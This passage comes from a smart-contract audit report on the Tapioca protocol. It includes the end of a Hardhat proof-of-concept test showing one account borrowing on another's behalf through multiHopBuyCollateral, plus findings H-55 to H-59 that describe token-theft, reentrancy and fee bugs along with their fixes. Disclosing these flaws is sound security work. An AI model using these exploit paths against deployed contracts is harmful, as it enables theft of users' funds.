            const erc20Mock = await ERC20Mock.deploy(
                'erc20Mock',
                'MOCK',
                0,
                18,
                deployer.address,
            );
            await erc20Mock.toggleRestrictions();

            // master contract
            const mediumRiskMC_0 = await (
                await ethers.getContractFactory('Singularity')
            ).deploy();
            await mediumRiskMC_0.deployed();
            await BAR_0.registerSingularityMasterContract(
                mediumRiskMC_0.address,
                1,
            );

            const mediumRiskMCBigBang_0 = await (
                await ethers.getContractFactory('BigBang')
            ).deploy();
            await mediumRiskMCBigBang_0.deployed();
            await BAR_0.registerBigBangMasterContract(
                mediumRiskMCBigBang_0.address,
                1,
            );

            //Deploy TapiocaOFT
            {
                const txData =
                    await tapiocaWrapper_0.populateTransaction.createTOFT(
                        erc20Mock.address,
                        (
                            await Tx_deployTapiocaOFT(
                                LZEndpointMock_chainID_0.address,
                                false,
                                erc20Mock.address,
                                YieldBox_0.address,
                                31337,
                                deployer,
                            )
                        ).txData,
                        ethers.utils.randomBytes(32),
                        false,
                    );
                txData.gasLimit = await hre.ethers.provider.estimateGas(txData);
                await deployer.sendTransaction(txData);
            }
            const tapiocaOFT0 = (await attachTapiocaOFT(
                await tapiocaWrapper_0.tapiocaOFTs(
                    (await tapiocaWrapper_0.tapiocaOFTLength()).sub(1),
                ),
                deployer,
            )) as TapiocaOFT;

            {
                const txData =
                    await tapiocaWrapper_10.populateTransaction.createTOFT(
                        erc20Mock.address,
                        (
                            await Tx_deployTapiocaOFT(
                                LZEndpointMock_chainID_10.address,
                                false,
                                erc20Mock.address,
                                YieldBox_0.address,
                                31337,
                                deployer,
                            )
                        ).txData,
                        ethers.utils.randomBytes(32),
                        false,
                    );
                txData.gasLimit = await hre.ethers.provider.estimateGas(txData);
                await deployer.sendTransaction(txData);
            }
            const tapiocaOFT10 = (await attachTapiocaOFT(
                await tapiocaWrapper_10.tapiocaOFTs(
                    (await tapiocaWrapper_10.tapiocaOFTLength()).sub(1),
                ),
                deployer,
            )) as TapiocaOFT;

            //Deploy strategies
            const Strategy_0 = await createTokenEmptyStrategy(
                YieldBox_0.address,
                tapiocaOFT0.address,
            );
            const Strategy_10 = await createTokenEmptyStrategy(
                YieldBox_0.address,
                tapiocaOFT10.address,
            );

            // Set trusted remotes
            const dstChainId0 = await LZEndpointMock_chainID_0.getChainId();
            const dstChainId10 = await LZEndpointMock_chainID_10.getChainId();

            await USDO_0.setTrustedRemote(
                dstChainId10,
                ethers.utils.solidityPack(
                    ['address', 'address'],
                    [USDO_10.address, USDO_0.address],
                ),
            );
            await USDO_0.setTrustedRemote(
                31337,
                ethers.utils.solidityPack(
                    ['address', 'address'],
                    [USDO_10.address, USDO_0.address],
                ),
            );

            await USDO_10.setTrustedRemote(
                dstChainId0,
                ethers.utils.solidityPack(
                    ['address', 'address'],
                    [USDO_0.address, USDO_10.address],
                ),
            );
            await USDO_10.setTrustedRemote(
                31337,
                ethers.utils.solidityPack(
                    ['address', 'address'],
                    [USDO_0.address, USDO_10.address],
                ),
            );

            await tapiocaWrapper_0.executeTOFT(
                tapiocaOFT0.address,
                tapiocaOFT0.interface.encodeFunctionData('setTrustedRemote', [
                    dstChainId10,
                    ethers.utils.solidityPack(
                        ['address', 'address'],
                        [tapiocaOFT10.address, tapiocaOFT0.address],
                    ),
                ]),
                true,
            );

            await tapiocaWrapper_0.executeTOFT(
                tapiocaOFT0.address,
                tapiocaOFT0.interface.encodeFunctionData('setTrustedRemote', [
                    31337,
                    ethers.utils.solidityPack(
                        ['address', 'address'],
                        [tapiocaOFT10.address, tapiocaOFT0.address],
                    ),
                ]),
                true,
            );

            await tapiocaWrapper_10.executeTOFT(
                tapiocaOFT10.address,
                tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [
                    dstChainId0,
                    ethers.utils.solidityPack(
                        ['address', 'address'],
                        [tapiocaOFT0.address, tapiocaOFT10.address],
                    ),
                ]),
                true,
            );

            await tapiocaWrapper_10.executeTOFT(
                tapiocaOFT10.address,
                tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [
                    dstChainId10,
                    ethers.utils.solidityPack(
                        ['address', 'address'],
                        [tapiocaOFT0.address, tapiocaOFT10.address],
                    ),
                ]),
                true,
            );

            await tapiocaWrapper_10.executeTOFT(
                tapiocaOFT10.address,
                tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [
                    31337,
                    ethers.utils.solidityPack(
                        ['address', 'address'],
                        [tapiocaOFT0.address, tapiocaOFT10.address],
                    ),
                ]),
                true,
            );

            // Link endpoints with addresses
            await LZEndpointMock_chainID_0.setDestLzEndpoint(
                tapiocaOFT0.address,
                LZEndpointMock_chainID_10.address,
            );
            await LZEndpointMock_chainID_10.setDestLzEndpoint(
                tapiocaOFT0.address,
                LZEndpointMock_chainID_0.address,
            );
            await LZEndpointMock_chainID_0.setDestLzEndpoint(
                tapiocaOFT0.address,
                LZEndpointMock_chainID_0.address,
            );

            await LZEndpointMock_chainID_10.setDestLzEndpoint(
                tapiocaOFT10.address,
                LZEndpointMock_chainID_10.address,
            );
            await LZEndpointMock_chainID_0.setDestLzEndpoint(
                tapiocaOFT10.address,
                LZEndpointMock_chainID_10.address,
            );
            await LZEndpointMock_chainID_10.setDestLzEndpoint(
                tapiocaOFT10.address,
                LZEndpointMock_chainID_0.address,
            );

            await LZEndpointMock_chainID_0.setDestLzEndpoint(
                USDO_10.address,
                LZEndpointMock_chainID_10.address,
            );
            await LZEndpointMock_chainID_0.setDestLzEndpoint(
                USDO_0.address,
                LZEndpointMock_chainID_10.address,
            );
            await LZEndpointMock_chainID_10.setDestLzEndpoint(
                USDO_0.address,
                LZEndpointMock_chainID_0.address,
            );
            await LZEndpointMock_chainID_10.setDestLzEndpoint(
                USDO_10.address,
                LZEndpointMock_chainID_0.address,
            );

            //Register tokens on YB
            await YieldBox_0.registerAsset(
                1,
                tapiocaOFT0.address,
                Strategy_0.address,
                0,
            );
            await YieldBox_0.registerAsset(
                1,
                tapiocaOFT10.address,
                Strategy_10.address,
                0,
            );

            const tapiocaOFT0Id = await YieldBox_0.ids(
                1,
                tapiocaOFT0.address,
                Strategy_0.address,
                0,
            );
            const tapiocaOFT10Id = await YieldBox_0.ids(
                1,
                tapiocaOFT10.address,
                Strategy_10.address,
                0,
            );
            expect(tapiocaOFT0Id.gt(0)).to.be.true;
            expect(tapiocaOFT10Id.gt(0)).to.be.true;
            expect(tapiocaOFT10Id.gt(tapiocaOFT0Id)).to.be.true;

            const bigDummyAmount = ethers.utils.parseEther('10');
            await mintAndApprove(
                erc20Mock,
                tapiocaOFT0,
                deployer,
                bigDummyAmount,
            );
            await tapiocaOFT0.wrap(
                deployer.address,
                deployer.address,
                bigDummyAmount,
            );

            await tapiocaOFT0.approve(
                YieldBox_0.address,
                ethers.constants.MaxUint256,
            );
            const toDepositShare = await YieldBox_0.toShare(
                tapiocaOFT0Id,
                bigDummyAmount,
                false,
            );
            await YieldBox_0.depositAsset(
                tapiocaOFT0Id,
                deployer.address,
                deployer.address,
                0,
                toDepositShare,
            );

            let yb0Balance = await YieldBox_0.amountOf(
                deployer.address,
                tapiocaOFT0Id,
            );
            expect(yb0Balance.eq(bigDummyAmount)).to.be.true; //bc of the yield
            const { stableToUsdoBidder, curveSwapper } =
                await deployCurveStableToUsdoBidder(
                    YieldBox_0,
                    tapiocaOFT0,
                    USDO_0,
                    false,
                );
            let sglMarketData = await createWethUsd0Singularity(
                USDO_0,
                tapiocaOFT0,
                BAR_0,
                await BAR_0.usdoAssetId(),
                tapiocaOFT0Id,
                mediumRiskMC_0,
                YieldBox_0,
                stableToUsdoBidder,
                0,
            );
            const SGL_0 = sglMarketData.wethUsdoSingularity;

            sglMarketData = await createWethUsd0Singularity(
                USDO_0,
                tapiocaOFT10,
                BAR_0,
                await BAR_0.usdoAssetId(),
                tapiocaOFT10Id,
                mediumRiskMC_0,
                YieldBox_0,
                stableToUsdoBidder,
                0,
            );
            const SGL_10 = sglMarketData.wethUsdoSingularity;

            await tapiocaOFT0.approve(
                SGL_0.address,
                ethers.constants.MaxUint256,
            );
            await YieldBox_0.setApprovalForAll(SGL_0.address, true);
            await SGL_0.addCollateral(
                deployer.address,
                deployer.address,
                false,
                bigDummyAmount,
                0,
            );
            const collateralShare = await SGL_0.userCollateralShare(
                deployer.address,
            );
            expect(collateralShare.gt(0)).to.be.true;

            const collateralAmount = await YieldBox_0.toAmount(
                tapiocaOFT0Id,
                collateralShare,
                false,
            );
            expect(collateralAmount.eq(bigDummyAmount)).to.be.true;

            //test wrap
            await mintAndApprove(
                erc20Mock,
                tapiocaOFT10,
                deployer,
                bigDummyAmount,
            );
            await tapiocaOFT10.wrap(
                deployer.address,
                deployer.address,
                bigDummyAmount,
            );
            const tapioca10Balance = await tapiocaOFT10.balanceOf(
                deployer.address,
            );
            expect(tapioca10Balance.eq(bigDummyAmount)).to.be.true;

            await tapiocaOFT10.approve(
                YieldBox_0.address,
                ethers.constants.MaxUint256,
            );
            await YieldBox_0.depositAsset(
                tapiocaOFT10Id,
                deployer.address,
                deployer.address,
                0,
                toDepositShare,
            );

            yb0Balance = await YieldBox_0.amountOf(
                deployer.address,
                tapiocaOFT10Id,
            );
            expect(yb0Balance.eq(bigDummyAmount)).to.be.true; //bc of the yield

            await tapiocaOFT10.approve(
                SGL_10.address,
                ethers.constants.MaxUint256,
            );
            await YieldBox_0.setApprovalForAll(SGL_10.address, true);
            await SGL_10.addCollateral(
                deployer.address,
                deployer.address,
                false,
                bigDummyAmount,
                0,
            );

            const sgl10CollateralShare = await SGL_10.userCollateralShare(
                deployer.address,
            );
            expect(sgl10CollateralShare.eq(collateralShare)).to.be.true;
            const UniswapV3SwapperMock = new UniswapV3SwapperMock__factory(
                deployer,
            );
            const uniV3SwapperMock = await UniswapV3SwapperMock.deploy(
                ethers.constants.AddressZero,
            );

            //lend some USD0 to SGL_10
            const oraclePrice = BN(1).mul((1e18).toString());
            const OracleMock = new OracleMock__factory(deployer);
            const oracleMock = await OracleMock.deploy(
                'WETHMOracle',
                'WETHMOracle',
                (1e18).toString(),
            );
            await wethUsdcOracle.deployed();
            await wethUsdcOracle.set(oraclePrice);

            const { bigBangMarket } = await registerBigBangMarket(
                mediumRiskMCBigBang_0.address,
                YieldBox_0,
                BAR_0,
                weth,
                await BAR_0.wethAssetId(),
                oracleMock,
                0,
                0,
                0,
                0,
                0,
            );
            await weth.freeMint(bigDummyAmount.mul(5));
            await weth.approve(
                bigBangMarket.address,
                ethers.constants.MaxUint256,
            );
            await weth.approve(YieldBox_0.address, ethers.constants.MaxUint256);
            await YieldBox_0.setApprovalForAll(bigBangMarket.address, true);
            await YieldBox_0.depositAsset(
                await BAR_0.wethAssetId(),
                deployer.address,
                deployer.address,
                bigDummyAmount.mul(5),
                0,
            );
            await bigBangMarket.addCollateral(
                deployer.address,
                deployer.address,
                false,
                bigDummyAmount.mul(5),
                0,
            );
            const bigBangCollateralShare =
                await bigBangMarket.userCollateralShare(deployer.address);
            expect(bigBangCollateralShare.gt(0)).to.be.true;

            const collateralIdSaved = await bigBangMarket.collateralId();
            const wethId = await BAR_0.wethAssetId();
            expect(collateralIdSaved.eq(wethId)).to.be.true;

            await USDO_0.setMinterStatus(bigBangMarket.address, true);
            await bigBangMarket.borrow(
                deployer.address,
                deployer.address,
                bigDummyAmount.mul(3),
            );

            const usdoBorrowPart = await bigBangMarket.userBorrowPart(
                deployer.address,
            );
            expect(usdoBorrowPart.gt(0)).to.be.true;

            await YieldBox_0.withdraw(
                await bigBangMarket.assetId(),
                deployer.address,
                deployer.address,
                bigDummyAmount.mul(3),
                0,
            );
            const usdoBalance = await USDO_0.balanceOf(deployer.address);
            expect(usdoBalance.gt(0)).to.be.true;

            const usdoBalanceShare = await YieldBox_0.toShare(
                await bigBangMarket.assetId(),
                usdoBalance.div(2),
                false,
            );
            await USDO_0.approve(
                YieldBox_0.address,
                ethers.constants.MaxUint256,
            );
            await YieldBox_0.depositAsset(
                await bigBangMarket.assetId(),
                deployer.address,
                deployer.address,
                usdoBalance.div(2),
                0,
            );
            await SGL_10.addAsset(
                deployer.address,
                deployer.address,
                false,
                usdoBalanceShare,
            );
            const totalSGL10Asset = await SGL_10.totalAsset();
            expect(totalSGL10Asset[0].gt(0)).to.be.true;

            let airdropAdapterParamsDst = hre.ethers.utils.solidityPack(
                ['uint16', 'uint', 'uint', 'address'],
                [
                    2,
                    1_000_000, //extra gas limit; min 200k
                    ethers.utils.parseEther('2'), //amount of eth to airdrop
                    USDO_10.address,
                ],
            );

            const airdropAdapterParamsSrc = hre.ethers.utils.solidityPack(
                ['uint16', 'uint', 'uint', 'address'],
                [
                    2,
                    1_000_000, //extra gas limit; min 200k
                    ethers.utils.parseEther('1'), //amount of eth to airdrop
                    magnetar.address,
                ],
            );

            const sgl10Asset = await SGL_10.asset();
            expect(sgl10Asset).to.eq(USDO_0.address);

            const userCollateralShareBefore = await SGL_0.userCollateralShare(
                deployer.address,
            );
            expect(userCollateralShareBefore.eq(bigDummyAmount.mul(1e8))).to.be
                .true;

            const borrowPartBefore = await SGL_10.userBorrowPart(
                deployer.address,
            );
            expect(borrowPartBefore.eq(0)).to.be.true;

            await BAR_0.setSwapper(uniV3SwapperMock.address, true);

            await SGL_0.approve(
                tapiocaOFT0.address,
                ethers.constants.MaxUint256,
            );
            await SGL_0.approveBorrow(
                tapiocaOFT0.address,
                ethers.constants.MaxUint256,
            );

            await SGL_10.connect(eoa1).multiHopBuyCollateral(
                deployer.address,
                0,
                bigDummyAmount,
                {
                    tokenOut: await tapiocaOFT10.erc20(),
                    amountOutMin: 0,
                    data: ethers.utils.toUtf8Bytes(''),
                },
                {
                    srcExtraGasLimit: 1_000_000,
                    lzSrcChainId: 0,
                    lzDstChainId: 10,
                    zroPaymentAddress: ethers.constants.AddressZero,
                    dstAirdropAdapterParam: airdropAdapterParamsDst,
                    srcAirdropAdapterParam: airdropAdapterParamsSrc,
                    refundAddress: deployer.address,
                },
                {
                    swapper: uniV3SwapperMock.address,
                    magnetar: magnetar.address,
                    tOft: tapiocaOFT10.address,
                    srcMarket: SGL_0.address, //there should be SGL_10 here in a normal situation; however, due to the current setup and how tokens are linked together, it will point to SGL_0
                },
                {
                    value: ethers.utils.parseEther('10'),
                },
            );
            const userCollateralShareAfter = await SGL_0.userCollateralShare(
                deployer.address,
            );

            expect(userCollateralShareAfter.gt(userCollateralShareBefore)).to.be
                .true;
            const userCollateralAmount = await YieldBox_0.toAmount(
                tapiocaOFT10Id,
                userCollateralShareAfter,
                false,
            );
            expect(userCollateralAmount.eq(bigDummyAmount.mul(2))).to.be.true;
            const borrowPartAfter = await SGL_10.userBorrowPart(
                deployer.address,
            );
            expect(borrowPartAfter.gt(bigDummyAmount)).to.be.true;
        });
    });
});
```

</details>

*   The PoC will demonstrate how an attacker can take borrows on behalf of other users without having any allowance by exploiting a vulnerability in the multiHopBuyCollateral()

![Result of the PoC](https://res.cloudinary.com/djt3zbrr3/image/upload/v1690321971/Result_of_the_PoC\_-\_High\_2\_f8irg9.png)

### Recommended Mitigation Steps

*   Make sure to validate that the caller has enough allowance to take the borrow specified by the `borrowAmount`.
*   Use the returned amount `borrowShare` from the `_borrow()` to validate if the caller has enough allowance to take that borrow.

```solidity
function multiHopBuyCollateral(
    address from,
    uint256 collateralAmount,
    uint256 borrowAmount,
    IUSDOBase.ILeverageSwapData calldata swapData,
    IUSDOBase.ILeverageLZData calldata lzData,
    IUSDOBase.ILeverageExternalContractsData calldata externalData
) external payable notPaused solvent(from) {
    ...

    //borrow
    (, uint256 borrowShare) = _borrow(from, from, borrowAmount);

+   //@audit => Validate that the caller has enough allowance to take the borrow
+   _allowedBorrow(from, borrowShare);

    ...
}
```

**[0xRektora (Tapioca) confirmed via duplicate issue 121](https://github.com/code-423n4/2023-07-tapioca-findings/issues/121)**

***

## [[H-55] `_sendToken` implementation in `Balancer.sol` is wrong which will make the underlying erc20 be send to a random address and lost](https://github.com/code-423n4/2023-07-tapioca-findings/issues/369)
*Submitted by [Vagner](https://github.com/code-423n4/2023-07-tapioca-findings/issues/369)*

The function `_sendToken` is called on `rebalance` to perform the rebalance operation by the owner which will transfer native token or the underlying ERC20 for a specific tOFT token to other chains. This function uses the `router` from Stargate to transfer the tokens, but the implementation of the `swap` is done wrong which will make the tokens to be lost.

### Proof of Concept

`_sendToken` calls Stargate's router `swap` function with the all the parameters needed as can be seen here <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/Balancer.sol#L322-L332>, but the problem relies that the destination address is computed by calling `abi.encode(connectedOFTs[_oft][_dstChainId].dstOft)` instead of the `abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft)` <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/Balancer.sol#L316-L318>.
Per Stargate documentation <https://stargateprotocol.gitbook.io/stargate/developers/how-to-swap> , the address of the swap need to casted to bytes by using `abi.encodePacked` and not `abi.encode`, casting which is done correctly in the `_sendNative` function <https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/Balancer.sol#L291> . The big difference between `abi.encodePacked` and `abi.encode` is that `abi.encode` will fill the remaining 12 bytes of casting a 20 bytes address with 0 values. Here is an example of casting the address `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`

```solidity
bytes normalAbi = 0x0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4;
bytes packedAbi = 0x5b38da6a701c568545dcfcb03fcb875f56beddc4;
```

This will hurt the whole logic of the `swap` since when the `lzReceive` function on the `Bridge.sol` contract from Startgate will be called, the address where the funds will be sent will be a wrong address. As you can see here the `lzReceive` on `Bridge.sol` for Abitrum for example uses assembly to load 20 bytes of the `payload` to the `toAddress`  <https://arbiscan.io/address/0x352d8275aae3e0c2404d9f68f6cee084b5beb3dd#code#F1#L88>
which in our case, for the address that I provided as an example it would be

```solidity
toAddress = 0x0000000000000000000000005b38Da6A701c5685;
```

because `abi.encode` was used instead of `abi.ecnodePacked`.
Then it will try to swap the tokens to this address, by calling `sgReceive` on it, which will not exist in most of the case and the assets will be lost, as specified by Stargate documentation <https://stargateprotocol.gitbook.io/stargate/composability-stargatecomposed.sol>

### Recommended Mitigation Steps

Use `abi.encodePacked` instead of `abi.encode` on `_sendToken`, same as the protocol does in `_sendNative`, so the assumptions will be correct.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/369#issuecomment-1680940751)**

***

## [[H-56] Tokens can be stolen from other users who have approved Magnetar](https://github.com/code-423n4/2023-07-tapioca-findings/issues/351)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/351), also found by [Madalad](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1508), [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1385), [kutugu](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1198), [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/926), 0xStalin ([1](https://github.com/code-423n4/2023-07-tapioca-findings/issues/790), [2](https://github.com/code-423n4/2023-07-tapioca-findings/issues/643)), [0xTheC0der](https://github.com/code-423n4/2023-07-tapioca-findings/issues/650), cergyk ([1](https://github.com/code-423n4/2023-07-tapioca-findings/issues/251), [2](https://github.com/code-423n4/2023-07-tapioca-findings/issues/216)), [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/212), and [erebus](https://github.com/code-423n4/2023-07-tapioca-findings/issues/106)*

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L622-L635> 

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2Storage.sol#L336-L338> 

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L70> 

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L212-L241> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/MarketERC20.sol#L84-L91>

The `MagnetarV2.sol` contract is a helper contract that allows users to interact with other parts of the Tapioca ecosystem. In order for Magnetar to be able to perform actions on behalf of a user, the user has to approve the contract as an approved spender (or equivalent) of the relevant tokens in the part of the Tapioca ecosystem the user wants to interact with.

In order to avoid abuse, many of the actions that Magnetar can perform are protected by a check that the owner of the position/token needs to be the `msg.sender` of the user interacting with Magnetar. However, there are some methods that are callable through Magnetar that don't have this check. This allows a malicious user to use approvals other users have made to Magnetar to steal their underlying tokens.

### Proof of Concept

As I mentioned above, many of the Magnetar methods have a check to ensure that the `msg.sender` is the "from" address for the subsequent interactions with other parts of the Tapioca ecosystem. This check is performed by the `_checkSender` method:

        function _checkSender(address _from) internal view {
            require(_from == msg.sender, "MagnetarV2: operator not approved");
        }

This function does what it is designed to do, however there are some methods that don't include this protection when they should.

One example is the `MARKET_BUY_COLLATERAL` action that allows a user to buy collateral in a market:

                else if (_action.id == MARKET_BUY_COLLATERAL) {
                    HelperBuyCollateral memory data = abi.decode(
                        _action.call[4:],
                        (HelperBuyCollateral)
                    );

                    IMarket(data.market).buyCollateral(
                        data.from,
                        data.borrowAmount,
                        data.supplyAmount,
                        data.minAmountOut,
                        address(data.swapper),
                        data.dexData
                    );
                }

In the market contract there is an underlying call to check whether the sender has the allowance to buy collateral:

        function _allowedBorrow(address from, uint share) internal {
            if (from != msg.sender) {
                if (allowanceBorrow[from][msg.sender] < share) {
                    revert NotApproved(from, msg.sender);
                }
                allowanceBorrow[from][msg.sender] -= share;
            }
        }

Since the `msg.sender` from the perspective of the market is Magnetar, the user would need to provide a borrow allowance to Magnetar to perform this action through Magnetar.

However, you can see above in the `MARKET_BUY_COLLATERAL` code snippet that there is no call to `_checkSender`. As a result, a malicious user can now pass in an arbitrary `data.from` address to use the allowance provided by another user to perform an unauthorised action. In this case, the malicious user could lever up the user's position to increase the user's LTV and therefore push the user closer to insolvency; at which point the user can be liquidated for a profit.

Another example of this issue is with the `depositRepayAndRemoveCollateralFromMarket` method in `MagnetarMarketModule.sol`. In this instance a malicious user can drain approved tokens from any other user by depositing into the Magnetar yield box:

            // deposit to YieldBox
            if (depositAmount > 0) {
                _extractTokens(
                    extractFromSender ? msg.sender : user,
                    assetAddress,
                    depositAmount
                );
                IERC20(assetAddress).approve(address(yieldBox), depositAmount);
                yieldBox.depositAsset(
                    assetId,
                    address(this),
                    address(this),
                    depositAmount,
                    0
                );
            }

This is a small snippet from the underlying `_depositRepayAndRemoveCollateralFromMarket` method that doesn't include a call to `_checkSender` and therefore the malicious user can simply set `extractFromSender` to false and specify an arbitrary user address.

### Recommended Mitigation Steps

The `_checkSender` method should be used in every method in `MagnetarV2.sol` and `MagnetarMarketModule.sol` if it isn't already.

**[0xRektora (Tapioca) confirmed via duplicate issue 106](https://github.com/code-423n4/2023-07-tapioca-findings/issues/106)**

***

## [[H-57] twAML::participate - reentrancy via _safeMint can be used to brick reward distribution](https://github.com/code-423n4/2023-07-tapioca-findings/issues/329)
*Submitted by [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/329)*

A malicious user can use reentrancy in twAML to brick reward distribution

### Proof of Concept

As we can see in `participate` in twAML, the function `_safeMint` is used to mint the voting position to the user;

However this function executes a callback on the destination contract: `onERC721Received`, which can then be used to reenter:

```solidity
// Mint twTAP position
tokenId = ++mintedTWTap;
_safeMint(_participant, tokenId);
```

The `_participant` contract can reenter in `exitPosition`, and release the position since,

```solidity
require(position.expiry <= block.timestamp, "twTAP: Lock not expired");
```

`position.expiry` is not set yet.

However we see that the following effects are executed after `_safeMint`:

    weekTotals[w0 + 1].netActiveVotes += int256(votes);
    weekTotals[w1 + 1].netActiveVotes -= int256(votes);

And these have a direct impact on reward distribution;
The malicious user can use reentrancy to increase `weekTotals[w0 + 1].netActiveVotes` by big amounts without even locking her tokens;

Later when the operator wants to distribute the rewards:

```solidity
function distributeReward(
    uint256 _rewardTokenId,
    uint256 _amount
) external {
    require(
        lastProcessedWeek == currentWeek(),
        "twTAP: Advance week first"
    );
    WeekTotals storage totals = weekTotals[lastProcessedWeek];
    IERC20 rewardToken = rewardTokens[_rewardTokenId];
    // If this is a DBZ then there are no positions to give the reward to.
    // Since reward eligibility starts in the week after locking, there is
    // no way to give out rewards THIS week.
    // Cast is safe: `netActiveVotes` is at most zero by construction of
    // weekly totals and the requirement that they are up to date.
    // TODO: Word this better
    totals.totalDistPerVote[_rewardTokenId] +=
        (_amount * DIST_PRECISION) /
        uint256(totals.netActiveVotes);
    rewardToken.safeTransferFrom(msg.sender, address(this), _amount);
}
```

totals.totalDistPerVote\[\_rewardTokenId] becomes zero

### Recommended Mitigation Steps

Use any of these:

*   Move effects before \_safeMint
*   Use nonReentrant modifier

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/329#issuecomment-1680836999)**

***

## [[H-58] A user with a TapiocaOFT allowance >0 could steal all the underlying ERC20 tokens of the owner](https://github.com/code-423n4/2023-07-tapioca-findings/issues/219)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/219), also found by [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1309), [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1038), [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/818), and [chaduke](https://github.com/code-423n4/2023-07-tapioca-findings/issues/439)*

The `TapiocaOFT.sol` contract allows users to wrap ERC20 tokens into an OFTV2 type contract to allow for seamless cross-chain use.

As with most ERC20 tokens, owners of tokens have the ability to give an allowance to another address to spend their tokens. This allowance should be decremented every time a user spends the owner's tokens. However the `TapiocaOFT.sol` `_wrap` method contains a bug that allows a user with a non-zero allowance to keep using the same allowance to spend the owner's tokens.

For example, if an owner had 100 tokens and gave an allowance of 10 to a spender, that spender would be able to spend all 100 tokens in 10 transactions.

### Proof of Concept

When a user wants to wrap a non-native ERC20 token into a TapiocaOFT they call `wrap` which calls `_wrap` under the hood:

        function _wrap(
            address _fromAddress,
            address _toAddress,
            uint256 _amount
        ) internal virtual {
            if (_fromAddress != msg.sender) {
                require(
                    allowance(_fromAddress, msg.sender) >= _amount,
                    "TOFT_allowed"
                );
            }
            IERC20(erc20).safeTransferFrom(_fromAddress, address(this), _amount);
            _mint(_toAddress, _amount);
        }

If the sender isn't the owner of the ERC20 tokens being wrapped, the allowance of the user is checked. However this isn't checking the underlying ERC20 allowance, but the allowance of the current contract (the TapiocaOFT).

Next, the underlying ERC20 token is transferred from the owner to this address. This decrements the allowance of the sender, however the sender isn't the original message sender, but this contract.

In order to use this contract as an owner (Alice) I would have to approve the `TapiocaOFT` contract to spend my ERC20 tokens, and it is common to approve this contract to spend all my tokens if I trust the contract. Now let's say I approved another user (Bob) to spend some (let's say 5) of my `TapiocaOFT` tokens. Bob can now call `wrap(aliceAddress, bobAddress, 5)` as many times as he wants to steal all of Alice's tokens.

### Recommended Mitigation Steps

In my opinion you shouldn't be able to wrap another user's ERC20 tokens into a different token, because this is a different action to spending. Also, there is no way to decrement the allowance of the user (of the TapiocaOFT token) in the same call as we aren't actually transferring any tokens; there is no function selector in the ERC20 spec to decrease an allowance from another contract.

Therefore I would suggest the following change:

    diff --git a/contracts/tOFT/BaseTOFT.sol b/contracts/tOFT/BaseTOFT.sol
    index 5658a0a..e8b7f63 100644
    --- a/contracts/tOFT/BaseTOFT.sol
    +++ b/contracts/tOFT/BaseTOFT.sol
    @@ -350,12 +350,7 @@ contract BaseTOFT is BaseTOFTStorage, ERC20Permit {
             address _toAddress,
             uint256 _amount
         ) internal virtual {
    -        if (_fromAddress != msg.sender) {
    -            require(
    -                allowance(_fromAddress, msg.sender) >= _amount,
    -                "TOFT_allowed"
    -            );
    -        }
    +        require (_fromAddress == msg.sender, "TOFT_allowed");
             IERC20(erc20).safeTransferFrom(_fromAddress, address(this), _amount);
             _mint(_toAddress, _amount);
         }

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/219#issuecomment-1685311808)**

***

## [[H-59] The BigBang contract take more fees than it should](https://github.com/code-423n4/2023-07-tapioca-findings/issues/87)
*Submitted by [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/87), also found by [mojito\_auditor](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1232), [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1111), [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/621), and [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/139)*

The repay function in the BigBang contract is used for users to repay their loans. The mechanics of the function are simple:

*   1.  Update the exchange rate
*   2.  Accrue the fees generated
*   3.  Call internal function \_repay

The internal function \_repay handles the state changes regarding the user debt. Specifically, fees are taken by withdrawing all the user's debt from yieldbox and burning the proportion that does not correspond to fees. The fees stay in the contract's balance to later be taken by the penrose contract. The logic can be seen here:

```solidity
function _repay(
        address from,
        address to,
        uint256 part
    ) internal returns (uint256 amount) {
        (totalBorrow, amount) = totalBorrow.sub(part, true);
        userBorrowPart[to] -= part;

        uint256 toWithdraw = (amount - part); //acrrued
        // @audit-issue Takes more fees than it should
        uint256 toBurn = amount - toWithdraw;
